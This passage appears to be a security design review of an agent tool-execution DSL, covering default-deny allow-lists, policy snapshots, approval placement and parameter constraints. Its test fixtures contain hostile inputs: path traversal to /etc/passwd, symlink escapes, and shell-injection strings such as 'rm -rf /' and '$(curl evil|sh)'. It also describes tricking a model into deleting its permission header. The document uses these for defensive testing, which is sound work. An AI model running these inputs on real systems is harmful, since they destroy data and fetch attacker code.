## 3 B3-1 `# allow:` 缺省行为

### 3.1 主张

规范必须写死三态，消灭「不写 = 全开」：

1. **无 `# allow:` → 有效集合为空（默认拒绝）。** 加载期拒绝，错误三要素：缺失 header + 注册表可用工具清单 + 一行修法。
2. **`# allow: a, b` → 仅该集合**（沿用现语义）。
3. **`# allow: *` → 等价旧的「继承注册表级」**，但显式、可 grep、必留审计记录；`# deny:` 仍优先（`:226`）。
4. 声明了 `# allow:` 但列表为空，与不写 header 同义（都拒绝），避免「空行 = 全开」的解析歧义。
5. 默认拒绝只作用于「有效集合」，不改第一层：注册表仍是第一层（`:207-214`）。

### 3.2 攻击者怎么绕过、成本多高

| 路径 | 说明 | 成本 |
| --- | --- | --- |
| 删 header | 全开是缺省形态，攻击者只需删一行，或诱导模型在修语法错误时「顺手清掉 header」 | 0 |
| 子脚本漂移 | 父脚本 `# allow: read`，emit 一个事件让内核派生的订阅脚本执行 `write`；若子 exec 不继承约束，等于纸糊 | 低（只需一次 emit） |
| 把 `*` 变成习惯 | `# allow: *` 一旦成为模型默认输出，默认拒绝被仪式化，收益归零 | 低 |

必须诚实写进规范的一句：**默认拒绝阻止的是「无意识授权」和「静默扩大」，不阻止「作者显式申请危险工具」**——header 由同一个不可信作者书写。把它吹成「阻止越权」是虚假安全感。

### 3.3 会不会误伤正常任务

- 文档六例全带 header（F6），主流形态零误伤。
- 真误伤只有「只读短脚本被迫多写一行」。修法成本一行，错误信息给 hint。与「未授权写盘」的代价不对称。
- 迁移成本：仓库实测 0 条脚本（F5）。现在定默认值零成本；发布后再改要背 `:510` 的兼容义务，成本是一个 `# dsl-version` 分支 + 双默认值。
- 长期误伤是 `*` 滥用。对策必须可测：M8 统计 `*` 占比，超阈值视为设计回退。

### 3.4 判据

- **C1.1** 规范中「缺省」只剩一个规范表述：无 header = 拒绝。`grep -n "继承注册表级"` 仅允许命中「`*` 等价旧语义」的说明句，且该句带「必须审计」。
- **C1.2** headerless 脚本加载失败，错误含位置 + `no '# allow:' header; tools are denied by default` + `Available: read, grep, write`。逐字夹具。
- **C1.3** 完备性：注册表 `{read,write}` 下，headerless 脚本调 `read` 也在**加载期**被拒；`# allow: read` 脚本调 `write` 在加载期被拒（复用 `:229` 的校验点，不得退化为执行期）。
- **C1.4** 子脚本继承：内核派生的子 exec 未显式给策略时，有效集合 ⊆ 父脚本有效集合，不得因「新脚本」拿到注册表全集。
- **C1.5** `*` 可审计：每次含 `# allow: *` 的加载产出一条审计记录（脚本路径 + 有效集合大小 + 理由字段）。

## 4 B3-2 白名单热更新竞态

### 4.1 主张

加载时构造不可变 `PolicySnapshot`：registry generation、allow/deny/emit 集、每个工具的 constraint version。`dsl_exec` 全程只读该快照；加载期集合校验与执行期参数校验读**同一 generation**。热更新 = 构建新快照 + 原子指针替换，只影响后续加载。两个例外：

- **强杀**：内核可在「下一次工具调用边界」中止在飞执行（不打断 handler 内部）。
- **撤销紧急通道**：同一开关，审计记 `revoked`。

### 4.2 攻击面

- **实时查的下行竞态（收紧）**：脚本加载通过，执行到第 3 个调用时策略收紧 → 前两个调用已产生副作用，脚本中途失败。这不是提权，是**半成品状态**：半个文件、半个事件；`:154` 只保证块中止，不保证回滚。
- **实时查的上行竞态（放宽）**：工具名在 AST 是静态字面量（文法 `primary := IDENT args`），加载期集合校验已完备；放宽不能让脚本调用 AST 里没有的工具。**上行不是提权路径**——这是本席不支持「实时查更安全」的核心论据。
- **真正的提权面在第三层**：约束是运行期才查的（`:249`）。实时查时，「加载时允许 `/workspace`、运行中被换成 `/`」的脚本获得了加载期未审的权限。快照堵这条。
- 快照代价：撤销不即时。长脚本在 `timeout_ms` / `max_steps`（`:288-294`）内可按旧策略跑完。必须写进规范并配强杀。

### 4.3 会不会误伤正常任务

- 运维期望「改完立刻生效」被快照打破。缓解：强杀开关 + 结果回显 `policy_generation`，运维能确认哪代策略跑了什么。
- 实现成本高于实时查：多一个 generation 字段、引用计数、一条中止分支。这是本席承认的代价。

### 4.4 判据

- **C2.1** 快照不可变：v1 `allow write` → 执行中发布 v2 `deny write` → 本 exec 仍成功。
- **C2.2** 下一代生效：同一场景后续新 exec 在**加载期**被拒，错误含 `policy generation 2`。
- **C2.3** 同代一致：一次 exec 的加载期错误与执行期错误都报同一 `policy_generation`；不存在加载用 v1、参数校验用 v2。变更约束后，旧 exec 的越界错误文案必须引用 v1 的约束文本。
- **C2.4** 强杀有界：撤销后，在飞 exec 在 ≤1 次工具调用内中止；结果 `ok=0` + `error_kind=revoked`，且保留已完成步骤的返回值（与 `dsl-discussion.md:343` 的部分结果口径一致）。
- **C2.5** 审计：每次热更新产出一条 diff（新增/移除工具、约束版本），形如 `added=[...] removed=[...] gen=N`。

### 4.5 E1 / E3 / E4 / E5

E1：`:249`（执行期第三层）、`:449`（加载时/执行时分账）、`:512`（热更新需审批/审计）、`:292-294`（ExecLimits 无策略代数字段）。

E3：若主张成立，「加载 → 收紧策略 → 继续执行」夹具应得 `ok=1` 且写盘成功；实时查实现应得 `ok=0`、第 3 次调用未执行、前两次副作用仍在。同一夹具跑两个实现即可判定。

E4：文档约 8 行（快照定义 + 强杀 + generation 回显）；实现 3 处（policy 引用计数、exec 持有快照、错误结构加字段）。回退：删字段回实时查，但**不回退** generation 回显（否则无法审计）。

E5（steelman）：对方最强论点是「撤销必须即时，否则等于策略失效」——`dsl-discussion.md:303` 自己写了『需要说明撤销策略对长脚本的延迟生效风险』。回应：即时撤销与「加载-执行原子一致」不可兼得；本席用强杀把延迟从「最长 timeout_ms」压到「一次工具调用」，且选择权在内核运维而非脚本作者。若强杀被证明不可实现，退让方案是「实时查 + 每步重校验 + 两层不一致即中止」，但必须承认 C2.3 无法满足（错误文案会前后代混用）。

## 5 B3-3 审批放哪 + 内核/DSL 边界

### 5.1 主张

1. 审批 100% 在内核。DSL 不加 `approve` 语句、不加 `# approval:` header、不加 `approval` 表达式。
2. DSL 侧唯一接口是工具元数据 `requires_approval`（bool 或内核侧谓词 id），由 `ToolDef` 声明（`:259-266` 加一字段），**脚本不可覆盖**。
3. 审批结果走错误通道：`ok=0, error_kind=approval_required|approval_denied`，脚本按 R4 中止块（`:154`）。不做暂停/恢复，不把审批变成脚本可捕获的值（MVP 无 try/catch，`:428`）。
4. 边界写进规范，且必须附**归属判定规则**，不能只列两张清单。

### 5.2 边界怎么写才可执行

规范新增一节「Rill 在 agent 运行时中的位置」（对应 `dsl-discussion.md:269-276` 的 P1-4）：

- **内核所有**：主循环、模型调用、上下文压缩、记忆/跨脚本状态、自修复回路、审批、调度/触发、工具注册与策略、事件订阅方注册。
- **DSL 所有**：单次执行的语法与语义——字面量工具调用、管道、条件/循环、作用域、emit、错误传播、ExecLimits。
- **归属规则（一条，可机械套用）**：任何需要「跨语句持久状态」或「挂起后恢复」的能力归内核；任何只依赖本次 `dsl_exec` 内值的能力才可进 DSL。这条同时排除审批、并行调度、重试循环（重试已由用户更正为工具参数 + `|?`，`dsl-discussion.md:70-78`）、记忆读写。

审批不能进 DSL 的三条理由（按强度排序）：

1. **没有暂停/恢复语义。** `dsl_exec` 是一次同步调用（`:280`），R4 只有中止没有续跑。DSL 级 `approve` 只能靠解释器内部保存 continuation，等于把内核状态机塞进脚本语义，直接违反 `:13`（「DSL 只暴露最薄的语句接口」）与单次执行边界。
2. **审批文案由作者提供 = 攻击者自述理由。** 若人类看到的「理由」是脚本字符串，审批退化为对攻击者的信任。理由必须由内核按工具名 + 参数生成（如 `write /etc/hosts`）。
3. **审批粒度是策略不是语法。** 同一个 `write` 在内网/生产要不同审批；策略属部署配置，进脚本就编码进内容且无法集中撤销。

### 5.3 会不会误伤正常任务

- 模型不知道某调用会触发审批 → 长任务被打断。对策：`ToolDef.description`（`:260` 已有通道）标注审批；内核在首次 `approval_required` 后对同一 `(tool, args-hash)` 在本次 exec 内缓存，避免循环内重复弹窗。
- 审批延迟若计入 `timeout_ms`，正常任务必超时。规范必须写明：审批等待不计入 `ExecLimits.timeout_ms`。
- 代价：内核多一个审批状态机 + 持久化；规范约 25–35 行；DSL 零新增语法（这正是核心收益）。

### 5.4 判据

- **C3.1** 语法面零审批：文法章无 approve/approval 产生式；保留字表不含它们；脚本写 `approve` 报未知标识符/未知工具（不得「保留但忽略」）。负例夹具 + 文法段 grep 0 命中。
- **C3.2** 脚本不可覆盖审批：无任何 header/表达式能设置 approval；`# approval:` 按未知 header 报错（与 P0-8 对 `# dsl-version` 的严格口径一致，`dsl-discussion.md:188-194`）。
- **C3.3** 边界节可机械判定：两张清单 + 一条归属规则；五个词（主循环、上下文压缩、记忆、自修复、审批）全部落在内核侧。
- **C3.4** 拒绝后无残留：`write` 作为第 2 个调用被拒 → 第 1 个调用副作用保留（不做事务），第 2 个 handler 调用计数为 0，块中止。
- **C3.5** 审批不超时：`timeout_ms=1000` + 审批等待 5000ms → 仍 `ok=1`，结果含 `approval_wait_ms`。

## 6 B3-4 参数级约束的强度

总原则：**第三层必须是运行期可执行的硬检查，不是文档里的形容词。** `:243` 列了五类约束，但除路径前缀外都没说强度，这是当前规范最大的安全空洞。

### 6.1 路径前缀：解析后判定 + 打开时复核

现文只有 `CONSTRAINT_PATH_PREFIX` + `/workspace/`（`:235-240`），未定义判定对象是原字符串还是规范路径。

| 绕过 | 手法 | 成本 |
| --- | --- | --- |
| 上跳 | `/workspace/../../etc/passwd` 以 `/workspace/` 开头，朴素前缀判定通过 | 0 |
| 符号链接 | `/workspace/link` 指向 `/etc`；字符串前缀通过，`open` 跟随后出界 | 0（工作区内建链接） |
| TOCTOU | 检查时界内，`open` 前被替换/重命名 | 中（需竞争） |
| 兄弟目录 | `/workspace-evil/x` 命中朴素 `startswith("/workspace")` | 0 |

主张（三条缺一不可）：

1. 判定对象是**解析后的**绝对路径；界内 = 解析结果等于 root 或以 `root + "/"` 为前缀（堵 `/workspace-evil`）。
2. 判定与打开同源：先 `openat` 拿 fd，再由 fd 派生路径（或最终组件 `O_NOFOLLOW` + 逐段校验），禁止「先 stat 字符串再 open 字符串」。
3. 写不存在的文件：CT 的 `realpath` 要求路径存在（`ct-lang/selfhost/ct-ast/frontend/module/Module.h.ct:1639-1641`），必须解析**父目录** realpath + 校验 basename 不是 symlink。不写这条，写新文件要么一律失败，要么绕过检查。

误伤：工作区内合法符号链接（`node_modules`、`bazel-out` 一类）会被「禁止一切 symlink」误杀。正确规则是「解析后仍在界内即可」，不是「禁 symlink」——C4.1 第 2、3 条正是用来区分这两种实现。

强度要求：前缀判定必须在 handler 之前（`:249` 现文即此），且 handler 不得再接受原始字符串自行拼路径；handler 应接收已校验的 fd 或已校验路径。

### 6.2 命令白名单：必须限定 argv 形态

现文只写「命令白名单」（`:243`），未说命令是字符串还是 argv。字符串形态下白名单只能匹配第一个 token：`AllowedCommand=git` 对 `git status; rm -rf /`、`$(curl evil|sh)`、`git -c core.pager='sh -c ...'` 全部放行。

这不是理论风险：CT 自身就用字符串 `system()` 跑 git，并为引号逃逸专写 `sh_quote`（`ct-lang/selfhost/ct-ast/tool/pkg/Pkg.h.ct:695,701-721`）——一个真实的、被迫处理转义的实现。照搬进 exec 工具，白名单就是装饰。

主张：

1. exec 类工具参数为 `argv: array<string>`；规范禁止 `shell: true` 一类布尔；无 shell 解释器参与。
2. 约束类型补 `CONSTRAINT_ARGV0_EXACT`（绝对路径，非 basename，防 PATH 劫持）与 `CONSTRAINT_ARGV_PREFIX`（有序前缀匹配）。
3. `sh -c` / `bash -c` / `env` / `xargs` 只在专门高危工具里允许，且该工具必须 `requires_approval`（与 B3-3 联动）。

误伤：真实任务需要管道/重定向，会诱使「加个 shell 开关」，等于把洞开回来。规范应明写「管道/重定向不属于 MVP 的 exec 能力」；需要时用多次工具调用表达（DSL 管道是值传递，不是进程管道，`:110-120`）。

token 代价：argv 数组比字符串多约 2–4 个引号/逗号。只对 exec 类付出，`read`/`grep`/`write` 不受影响；相对命令注入的代价可接受。

### 6.3 emit payload：要 schema，但 schema 不是主防线

现状：emit 有事件名白名单（`:227`）与次数上限（`:293`），payload 深拷贝（`:194`），但**无字节上限**——`max_output_bytes` 明写「单次工具结果」（`:292`），不覆盖 emit。1e8 字节 payload 会被拷贝给每个订阅方，n 个订阅方放大 n 倍。

主张：

1. 新增 `max_emit_bytes`（规范必须给具体默认数字，不写「由实现决定」）与 `max_payload_depth`。
2. 每条 `# emit:` 可带 schema：至少顶层字段名 + 标量类型；`strict: true` 时禁止额外字段。字面量 payload 在**加载期**校验（与 `:229` 同点），变量 payload 执行期校验。
3. 超限返回 `ok=0, error_kind=limit`，不得静默丢事件（「队列满丢弃」是总线侧语义，`:197`；参数级超限必须是脚本可见错误）。

诚实边界：schema 防的是「订阅方解析崩溃/事件契约漂移」，**不防数据外泄**——脚本可以把界内敏感内容塞进合法字符串字段，再 emit 给 webhook 订阅方。数据流管控属于内核订阅方授权（`:310` 已规定订阅方由内核配置）。这句必须写进规范，否则是虚假安全感。

误伤：对自由形态 payload 强制 strict 会打断合法用法。分层：默认只有字节/深度上限，schema 逐事件选择加入。

### 6.4 判据

- **C4.1** 路径夹具五件套：`/workspace/../../etc/passwd` 拒；`/workspace/link→/etc` 拒；`/workspace/link→/workspace/sub` 允；`/workspace/new.txt`（不存在）允；`/workspace-evil/x` 拒。
- **C4.2** 打开时复核：在「检查通过」与 `open` 之间把路径换成界外链接，必须拒绝。实现须能证明判定与打开基于同一 fd / 同一解析结果。
- **C4.3** exec 无 shell：schema 无 shell 开关；`["sh","-c","rm -rf /"]` 未专门授权时被拒；`["git","status; rm -rf /"]` 作为**单个参数**不产生第二个进程。
- **C4.4** argv[0] 绝对路径：注册表配 `"git"` 不合格，必须配 `/usr/bin/git` 或由内核解析后固定；夹具：PATH 放同名恶意脚本，调用仍走已注册绝对路径。
- **C4.5** emit 上限：1 MiB payload 拒；64 层嵌套拒；超限为脚本可见错误（`ok=0`），非静默丢弃。
- **C4.6** 覆盖缺口闭合：`:292` 的 `max_output_bytes` 不得再被用来暗示覆盖 emit；要么新增字段，要么显式写「emit payload 不计入」并给新字段。

### 6.5 E1 / E3 / E4 / E5

E1：`:235-243`（约束样例与类型清单，只有名字没有强度）、`:249`（第三层位置）、`:292`（`max_output_bytes` 只覆盖工具结果）、`:194`（深拷贝放大）、`Module.h.ct:1639-1641`、`Pkg.h.ct:695,701-721`。

E3：若主张成立，「前缀检查用原字符串」的实现应在 C4.1 第 1 条上放行 `/workspace/../../etc/passwd`——该夹具能区分两种实现；「字符串命令」实现应在 C4.3 上把 `; rm -rf /` 当 shell 语法执行。两条均单次夹具可判定。

E4：文档约 20–30 行（§5.3 重写 + ExecLimits 加 2 字段 + 事件 schema 段）；实现集中在 `read`/`write`/`exec` 三个 handler + 一个路径解析助手。回退：约束强度不可回退（回退即放弃安全底线），只能整体不采纳。

E5（steelman）：对方最强论点是「这些是实现细节，规范写死会绑死实现，且推高 token 与工期（`:498` 合计 7900 行、M8 900 行）」。回应：规范不必规定用 `openat` 还是 `O_NOFOLLOW`，但必须规定**可观测行为**（C4.1/C4.2 夹具），否则「路径前缀」只是形容词，M8 的 900 行无法验收。argv 同理：规定「无 shell 解释」是行为约束，不是实现约束。

## 9 我可能错在哪

1. **默认拒绝可能把模型推向 `# allow: *`。** 若 `*` 占比高，我争到的只是「显式化」，安全收益接近零，还多一层仪式。需要 M8 实测占比才能判定；若占比 >50%，本条应改判为「默认拒绝 + 禁 `*`」或「默认只读三类工具」。
2. **快照的核心论据依赖「工具名是静态字面量」。** 若将来引入动态派发（把工具名放变量、`call name args`、索引派发），加载期集合校验立即不完备，必须改实时查或每步重校验。我建议规范显式禁止动态工具名——但若对方指出 `postfix_expr`（`:85`）已隐含动态解析，我需要重新举证。这是本席最脆的一环。
3. **我优先保完整性（快照），可能低估「撤销必须即时」的运维刚需。** 若强杀实现成本被证明高于「实时查 + 每步重校验」，C2.1/C2.3 应让位。
4. **argv 不给 shell 会逼用户要「高危 shell 工具」**，而那个工具一旦存在，审批就是唯一防线；我无法证明审批一定可靠。长期看可能不如「受控管道 DSL」。
5. **emit schema 可能是装饰性规范。** 主风险是数据外泄（数据流），schema 只防解析崩溃。若评审以「无实测收益」为由砍掉 schema 只留字节/深度上限，我不反对。
6. **本仓库无实现、无门禁、无 golden**（E1-2 + `README.md` 状态段），我所有判据都是「规范层可判定 + 实现后夹具可判定」，**当前跑不绿**。若裁判要求 E1 必须是运行输出，则我关于行为的全部主张应判 `undecidable`，只剩文档事实类判据（C1.1、C3.1、C3.3、C4.3 的 schema 文本、C4.6）成立。
7. **我未记录 HEAD sha**（受「不要 git 操作」约束），E2 锚点是工作树位置；若评审以「锚点必须绑 HEAD」为硬条件，本席举证不合格，需证据席补 `git rev-parse HEAD` 后重锚。
8. **我未看到反对席原文**，E5 的 steelman 引用的是讨论稿里最接近对立面的段落（P1-8/P1-7/P1-9），不是 APPSEC 的实际反证清单。交叉质证轮若出现更强的失效条件，本文 §3–§6 的判据宽度可能需要收窄——但我不会为了让门禁通过而放宽判据。
